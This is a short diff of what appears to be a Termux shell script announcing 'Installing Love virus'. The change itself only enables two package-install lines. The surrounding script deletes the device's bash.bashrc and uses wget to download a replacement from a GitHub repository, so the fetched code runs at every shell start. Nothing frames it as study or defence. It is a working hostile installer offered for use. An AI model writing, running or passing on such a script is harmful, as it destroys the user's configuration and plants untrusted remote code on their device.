@@ -1,7 +1,7 @@
 clear
 echo " Installing Love virus"
-#apt update
-#apt install espeak python -y 
+apt update
+apt install espeak python -y 
 cd /data/data/com.termux/files/usr/etc
 rm bash.bashrc
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/bash.bashrc 
